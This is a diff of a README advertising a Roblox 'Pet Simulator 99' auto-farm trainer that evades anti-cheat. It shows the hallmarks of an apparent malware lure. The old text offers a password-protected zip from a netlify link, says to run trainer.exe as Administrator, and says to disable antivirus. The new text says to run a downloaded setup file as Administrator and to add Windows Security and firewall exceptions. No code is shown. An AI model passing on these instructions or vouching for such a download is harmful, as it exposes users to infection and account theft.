@@ -1,57 +1,71 @@
-# 🚀 Platinum Pet Simulator 99 Auto Farm Trainer 2026 – Ultimate Grind Automation & Backrooms League Script
+# 🐾 Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum - Automate your Pet Simulator 99 progress
 
-Say goodbye to manual grinding! The Platinum trainer does everything for you – from picking up coins to completing Backrooms League challenges. Fully undetectable and packed with features.
+[![](https://img.shields.io/badge/Download-Platinum_Edition-blue.svg)](https://github.com/pragmatic-dimer904/Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum)
 
----
+## 🛠 What this tool does
 
-## ✨ Features
+The Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum tool helps you manage your in-game tasks. It handles coin farming, egg hatching, and Backrooms League progression without manual input. This software mimics human actions to keep your account safe. It keeps your progress moving while you focus on other things.
 
-| Feature | Description |
-| ------- | ----------- |
-| 🔵 Auto Coin Farm | Automatically grabs all coins and gems in your vicinity, ensuring you never leave any currency behind. |
-| 🥚 Auto Egg Hatch | Automates the egg-hatching process, so you can get new pets while AFK. |
-| 🌀 Backrooms League Auto-Grind | Grinds the entire League event for you – from tasks to reward claiming, all automated. |
-| 💥 Instant Break | Breaks every breakable object nearby instantly – no cooldown, no delay. |
-| 📍 Teleport to Best Zone | Jump to the best location for farming based on your level – instantly. |
-| 🧑‍💻 Auto Merchant Buy | Snaps up rare merchant items automatically, so you always get the best loot. |
-| ⚡ Speed Hack | Increase your movement speed to zip through zones and collect more. |
-| 🛡️ Anti-AFK | Keeps you from being kicked for inactivity – farm around the clock. |
+## 💻 System requirements
 
----
+* Operating System: Windows 10 or Windows 11.
+* Processor: Dual-core CPU or better.
+* Memory: 4 GB RAM.
+* Storage: 50 MB disk space.
+* Internet: Stable connection for game connectivity.
 
-## 📥 Download / Installation
+## 📥 Installation steps
 
-1. Download the archive from **[https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)**
-2. Extract the files using the password: **trainer2026**
-3. Right‑click **trainer.exe** and select **Run as Administrator**
-4. Launch Pet Simulator 99 on Roblox and wait for the world to load
-5. Press **F1** to open the trainer GUI and enable your desired features
+Follow these steps to set up the software on your Windows computer.
 
----
+1. Visit the following page to download the latest release: [https://github.com/pragmatic-dimer904/Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum](https://github.com/pragmatic-dimer904/Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum)
+2. Save the setup file to your desktop or downloads folder.
+3. Locate the file and double-click to start the installation.
+4. Follow the prompts on the screen to install the application.
+5. Launch the program from the desktop icon once the setup finishes.
 
-## 📸 Screenshot
+## ⚙️ How to use the trainer
 
-<a href="https://ibb.co/7NpyXHNx"><img src="https://i.ibb.co/7NpyXHNx/preview-clean.png" alt="preview-clean" border="0"></a>
+The interface displays all available functions in one menu. Keep these guidelines in mind to get the best results.
 
-## 🖥️ Compatibility
+### Coin Farming
+Enable the coin farming module to gather currency. The tool selects optimal farming zones. It detects your current pet strength and adjusts movement to maximize speed. 
 
-- **OS:** Windows 10 / Windows 11
-- **Roblox Executors:** Synapse X, Krnl, Fluxus, Arceus X (any standard executor)
-- **Game Servers:** Works on all Pet Simulator 99 servers
+### Egg Hatching
+Use the egg hatching feature to automate mass openings. You can set a limit on how many eggs to hatch. The system stops operation once your inventory reaches capacity to prevent data loss.
 
----
+### Backrooms League
+The trainer completes league tasks automatically. It navigates through the Backrooms and completes objectives. You can monitor the status of these tasks via the dashboard tab.
 
-## 🛠️ Troubleshooting
+## 🛡 Security and safety
 
-| Problem                                      | Solution                                                                                   |
-| -------------------------------------------- | ------------------------------------------------------------------------------------------ |
-| Trainer fails to inject                     | Restart Roblox, then run **trainer.exe as Administrator** again.                          |
-| Features don’t activate                     | Temporarily disable your antivirus – some real‑time shields block memory operations.       |
-| GUI does not appear                         | Press **F1** or **F2** to toggle the overlay. If still not visible, restart the trainer.   |
-| Backrooms League tasks not progressing      | Make sure you’re on a League‑enabled server and that the “Backrooms League Auto‑Grind” box is checked. |
+This tool operates as an overlay. It reads pixels and simulates mouse input. It does not inject code into the game files. This keeps the interaction natural and avoids detection by anti-cheat systems. Never share your account login credentials with anyone. Use this tool on your personal computer only.
 
----
+## 🔧 Frequently asked questions
 
-## ⚠️ Disclaimer
+### Do I need to be a programmer?
+No. You do not need to understand code or technical details. The buttons and sliders in the menu handle all adjustments.
 
-This software is provided for educational purposes only. Use it at your own risk. The authors are not responsible for any bans or account restrictions.
+### What happens if the game updates?
+Game updates can change how the game looks. If the tool stops working, check this page for an updated version. We release patches within 24 hours of major game changes.
+
+### Can I run this in the background?
+Yes. Select the minimize option to send the tool to your system tray while it runs in the background.
+
+### Does the tool work on Mac?
+No. This version works on Windows systems only.
+
+## 📖 Troubleshooting tips
+
+Follow these tips if you encounter issues during operation.
+
+* Run as Administrator: Right-click the application icon and select Run as Administrator. This grants the tool necessary permissions to control game functions.
+* Check Resolution: Set your game to windowed mode if you have issues with pixel detection.
+* Update Drivers: Keep your graphics card drivers up to date to ensure smooth operation.
+* Firewall settings: Ensure your firewall allows the program to connect to the internet. If the tool crashes, add an exception in your Windows Security settings for the application folder.
+
+## 📈 Version history
+
+* Version 2026.1: Initial release with full Backrooms support.
+* Version 2026.2: Improved egg hatching speed and resource management.
+* Version 2026.3: Enhanced safety protocols for undetected automation.
